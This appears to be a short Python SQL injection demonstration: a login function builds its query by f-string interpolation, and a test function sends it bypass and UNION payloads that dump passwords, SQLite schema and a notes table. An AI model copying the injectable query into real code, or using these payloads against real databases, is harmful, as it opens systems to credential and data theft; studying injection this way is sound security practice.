

def run_query(db, uname, pword):
    cur = db.execute(f"select id, username from users where username = '{uname}' and password = '{pword}'")
    rv = cur.fetchall()
    cur.close()
    print(rv)
    return rv


def test_run_query(db):
    print("Start tests")
    run_query(db, '1234', '5678')
    run_query(db, 'marnie', '123456')
    run_query(db, "' or 1=1 -- -+", '123456')
    run_query(db, "1' UNION SELECT NULL, NULL -- -", '123456')
    run_query(db, "1' UNION SELECT 1,group_concat(password) FROM users-- -", '123456')
    run_query(db, "1' UNION select 1,tbl_name from sqlite_master -- -", '123456')
    run_query(db, "1' UNION SELECT NULL, sqlite_version(); -- -", '123456')
    run_query(db, "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='notes'; -- -", '123456')
    run_query(db, "' UNION SELECT 1,group_concat(notes) FROM notes-- -", '123456')
    print("Finish Tests")

